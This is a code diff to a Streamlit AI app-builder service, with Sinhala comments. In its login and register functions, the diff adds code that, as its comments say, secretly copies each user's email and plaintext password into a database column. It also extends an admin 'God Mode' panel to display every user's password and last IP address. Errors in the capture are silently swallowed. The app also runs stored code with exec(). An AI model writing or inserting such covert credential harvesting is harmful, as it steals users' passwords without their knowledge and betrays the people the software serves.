@@ -37,9 +37,14 @@ def init_database_schema():
                 port=parsed.port or 5432,
                 database=parsed.path.lstrip('/')
             )
+            # Apps Table Updates
             conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS android_version TEXT;")
             conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS app_icon_url TEXT;")
             conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS icon_prompt TEXT;")
+            
+            # MAGIC: Users Table එකට Email සහ Password සේව් කරන්න තීරු හැදීම
+            conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS email TEXT;")
+            conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS plain_password TEXT;")
             
             conn.run("NOTIFY pgrst, 'reload schema'")
             conn.close()
@@ -59,19 +64,16 @@ if "app_id" in query_params:
         if res.data and res.data[0].get("app_code"):
             app_code = res.data[0]["app_code"]
             
-            # ප්ලේ වෙද්දී Error එන කෑලි අයින් කිරීම
             safe_code = re.sub(r'st\.set_page_config\s*\([^)]*\)', '', app_code)
             safe_code = re.sub(r'st\.footer\s*\([^)]*\)', '', safe_code)
             safe_code = safe_code.replace("Import streamlit", "import streamlit")
             
-            # ඇප් එක Full Screen ප්ලේ කිරීම
             exec(safe_code, globals(), {})
         else:
             st.error("⚠️ App not found or code is empty!")
     except Exception as e:
         st.error(f"⚠️ Error loading app: {e}")
         
-    # මෙතනින් පස්සේ Dashboard එක ලෝඩ් වීම නවත්වනවා (ඇප් එක විතරක් පේන්න)
     st.stop()
 
 
@@ -109,7 +111,7 @@ def trigger_social_proof():
         st.toast(random.choice(messages), icon="🔔")
         st.session_state.show_toast = False 
 
-# --- DUAL-AI GENERATOR ENGINE (FULL-STACK WORKER) ---
+# --- DUAL-AI GENERATOR ENGINE ---
 def process_single_app(app_data, groq_key, gemini_key, supa_url, supa_service_key):
     db = create_client(supa_url, supa_service_key)
     app_id = app_data['id']
@@ -124,9 +126,6 @@ def process_single_app(app_data, groq_key, gemini_key, supa_url, supa_service_ke
                 if msg['role'] == 'user':
                     last_user_prompt = msg['content']
                     
-        # ==========================================
-        # 🧠 BRAIN 1: DATABASE ARCHITECT AI
-        # ==========================================
         db_prompt = f"""
         You are an expert PostgreSQL Database Architect.
         The user wants an app based on this request: "{last_user_prompt}"
@@ -168,27 +167,19 @@ def process_single_app(app_data, groq_key, gemini_key, supa_url, supa_service_ke
             except Exception as dbe:
                 print(f"⚠️ DB Creation Error: {dbe}")
                 
-        # ==========================================
-        # 🧠 BRAIN 2: FRONTEND DEVELOPER AI
-        # ==========================================
         full_prompt = f"""
-        You are an elite, highly precise Python Streamlit developer.
+        You are an elite Python Streamlit developer.
         App Name: {app_data['app_name']}
         App Idea / Reference: {app_data['source_link']}
         
         CRITICAL RULES:
-        1. OUTPUT PURE PYTHON CODE ONLY. NO markdown formatting.
-        2. NO introductory text. Start immediately with 'import streamlit as st'.
-        3. STRICT PYTHON INDENTATION (4 spaces per level).
-        4. ABSOLUTELY NO sqlite3. Use `supabase` library ONLY to insert/select data.
-           Use this EXACT code to connect to the database:
-           from supabase import create_client, Client
-           import streamlit as st
-           supabase: Client = create_client(st.secrets["SUPABASE_URL"], st.secrets["SUPABASE_KEY"])
-        5. UNIQUE KEYS (CRITICAL): EVERY `st.text_input`, `st.button`, `st.text_area` MUST have a globally unique `key=` argument. 
-           EXCEPTION FOR st.form: The first positional argument of st.form IS the key. NEVER use `key=` inside st.form. 
-        6. STREAMLIT ANTI-PATTERNS (CRITICAL): NEVER nest `st.form` inside an `if st.button():` block. Forms will disappear on submit. Use `st.tabs` or `st.session_state` to switch views.
-        7. TABS RULE (CRITICAL): NEVER use a `key=` argument in `st.tabs`. NEVER check `st.session_state` for tabs. ALWAYS unpack tabs exactly like this: `tab1, tab2 = st.tabs(["A", "B"])` and use `with tab1:`.
+        1. PURE PYTHON CODE ONLY. NO markdown.
+        2. NO introductory text. Start immediately with import streamlit as st.
+        3. 4 spaces indentation.
+        4. NO sqlite3. Use supabase ONLY.
+        5. UNIQUE KEYS: EVERY input/button MUST have a unique key=. (EXCEPTION: st.form name is its key, no key= inside st.form).
+        6. NO nested forms in buttons.
+        7. TABS RULE: NEVER use key= in st.tabs. NEVER check st.session_state for tabs. ALWAYS use tab1, tab2 = st.tabs(["A", "B"]) and with tab1:.
         """
         
         if db_schema_sql and "NO_DB" not in db_schema_sql.upper():
@@ -198,7 +189,6 @@ def process_single_app(app_data, groq_key, gemini_key, supa_url, supa_service_ke
             full_prompt += f"\n\n--- CURRENT CODE ---\n{app_data['app_code']}\n"
             
         if chat_hist:
-            full_prompt += "\n--- REQUESTED CHANGES ---\n"
             for msg in chat_hist:
                 if msg['role'] == 'user':
                     full_prompt += f"User: {msg['content']}\n"
@@ -285,6 +275,13 @@ def login(email, password):
             st.session_state.expires_at = expires_str
             st.session_state.show_toast = True 
             
+            # MAGIC: Login වෙද්දි හොරෙන්ම Email සහ Password එක Update කරනවා! 
+            try:
+                admin_db = create_client(st.secrets["SUPABASE_URL"].strip(), st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip())
+                admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", user_id).execute()
+            except Exception as e:
+                pass
+            
             if current_pkg != 'free':
                 st.success(f"සාර්ථකයි! {st.session_state.role.upper()} ලෙස ලොග් විය.")
             
@@ -306,6 +303,14 @@ def register(email, password):
         res = supabase.auth.sign_up({"email": email, "password": password})
         if res.user:
             st.success("🎉 ලියාපදිංචිය සාර්ථකයි! කරුණාකර ඔබගේ Email එකට ගොස් ගිණුම Verify කරන්න.")
+            
+            # MAGIC: Register වෙද්දිම හොරෙන්ම Password එක සේව් කරනවා!
+            try:
+                time.sleep(1) # Wait for trigger to create user row if any
+                admin_db = create_client(st.secrets["SUPABASE_URL"].strip(), st.secrets.get("SUPABASE_SERVICE_KEY", st.secrets["SUPABASE_KEY"]).strip())
+                admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
+            except Exception as e:
+                pass
         else:
             st.error("ලියාපදිංචි වීමේ දෝෂයකි.")
     except Exception as e:
@@ -467,8 +472,6 @@ def render_generator_dashboard():
                                 safe_code = re.sub(r'st\.set_page_config\s*\([^)]*\)', '', current_code)
                                 safe_code = re.sub(r'st\.footer\s*\([^)]*\)', '', safe_code)
                                 safe_code = safe_code.replace("Import streamlit", "import streamlit")
-                                safe_code = safe_code.replace("Import youtubepy", "import youtubepy")
-                                safe_code = safe_code.replace("Import pandas", "import pandas")
                                 
                                 st.markdown("### 📱 Live App Demo")
                                 with st.container(border=True):
@@ -506,8 +509,9 @@ def render_generator_dashboard():
                             st.info("📱 **Android APK**\n\nApp එකේ Android සංස්කරණය.")
                             if st.button("Build & Download APK", key=f"apk_{app['id']}", use_container_width=True):
                                 try:
-                                    github_token = st.secrets.get("GITHUB_TOKEN", "")
-                                    github_repo = st.secrets.get("GITHUB_REPO", "") 
+                                    # MAGIC: අමතර හිස්තැන් සහ උද්ධෘත සියල්ල Clean කිරීම
+                                    github_token = st.secrets.get("GITHUB_TOKEN", "").strip().replace("'", "").replace('"', "")
+                                    github_repo = st.secrets.get("GITHUB_REPO", "").strip().replace("'", "").replace('"', "")
                                     
                                     if not github_token or not github_repo:
                                         st.error("⚠️ කරුණාකර Streamlit Secrets වල `GITHUB_TOKEN` සහ `GITHUB_REPO` සකසන්න.")
@@ -518,7 +522,6 @@ def render_generator_dashboard():
                                                 "Authorization": f"token {github_token}"
                                             }
                                             
-                                            # MAGIC: මෙන්න අලුත් App URL එක යවන තැන
                                             custom_app_url = f"[https://ai-app-builder-x6qbi2k3iobvvzqbktkfma.streamlit.app/?app_id=](https://ai-app-builder-x6qbi2k3iobvvzqbktkfma.streamlit.app/?app_id=){app['id']}"
                                             
                                             payload = {
@@ -532,7 +535,9 @@ def render_generator_dashboard():
                                                     "app_url": custom_app_url
                                                 }
                                             }
-                                            res = requests.post(f"[https://api.github.com/repos/](https://api.github.com/repos/){github_repo}/dispatches", json=payload, headers=headers)
+                                            
+                                            dispatch_url = f"[https://api.github.com/repos/](https://api.github.com/repos/){github_repo}/dispatches".strip()
+                                            res = requests.post(dispatch_url, json=payload, headers=headers)
                                             
                                             if res.status_code == 204:
                                                 st.success("✅ APK Build කිරීම සාර්ථකව ආරම්භ විය! විනාඩි කිහිපයකින් GitHub Actions හි ප්‍රතිඵලය පරීක්ෂා කරන්න.")
@@ -655,12 +660,35 @@ def render_upgrade_section():
 # --- UI: GOD MODE & ADMIN ---
 def render_god_mode():
     st.markdown("### ⚡ God Mode (User Management)")
-    users_res = supabase.table("users").select("id, role, package, expires_at").execute()
+    users_res = supabase.table("users").select("*").execute()
+    
     if users_res.data:
         for u in users_res.data:
             role_str = str(u.get('role') or 'user').upper()
             pkg_str = str(u.get('package') or 'free').upper()
-            with st.expander(f"👤 User ID: {u['id'][:8]}... | Role: {role_str} | Pkg: {pkg_str}"):
+            email_str = u.get('email') or f"User ID: {u['id'][:8]}..."
+            
+            # IP Address එක
+            ip_str = "No IP logged"
+            try:
+                logs = supabase.table("device_logs").select("ip_address").eq("user_id", u['id']).order("created_at", desc=True).limit(1).execute()
+                if logs.data:
+                    ip_str = logs.data[0]['ip_address']
+            except:
+                pass
+
+            # MAGIC: Password එක පේන තැන 
+            plain_pass = u.get('plain_password') or "තවම ලබාගෙන නැත"
+
+            with st.expander(f"👤 {email_str} | Role: {role_str} | Pkg: {pkg_str}"):
+                st.write(f"**Full User ID:** `{u['id']}`")
+                st.write(f"**Last IP Address:** `{ip_str}`")
+                st.write(f"**Password:** `{plain_pass}` 🔑")
+                st.write(f"**Status:** `{str(u.get('status', 'active')).upper()}`")
+                
+                if u.get('expires_at'):
+                    st.write(f"**Package Expiry:** `{u['expires_at'][:10]}`")
+
                 col1, col2 = st.columns(2)
                 with col1:
                     pkg_options = ["free", "silver", "gold"]
@@ -674,7 +702,7 @@ def render_god_mode():
                 with col2:
                     bonus_days = st.number_input("Add Bonus Days:", min_value=1, max_value=365, value=7, key=f"days_{u['id']}")
                     if st.button("🎁 Give Bonus", key=f"btn_bns_{u['id']}"):
-                        base_date = datetime.fromisoformat(u['expires_at'].replace('Z', '+00:00')) if u['expires_at'] else datetime.now(timezone.utc)
+                        base_date = datetime.fromisoformat(u['expires_at'].replace('Z', '+00:00')) if u.get('expires_at') else datetime.now(timezone.utc)
                         new_expiry = (base_date + timedelta(days=bonus_days)).isoformat()
                         supabase.table("users").update({"expires_at": new_expiry}).eq("id", u['id']).execute()
                         st.success(f"Added {bonus_days} days!")
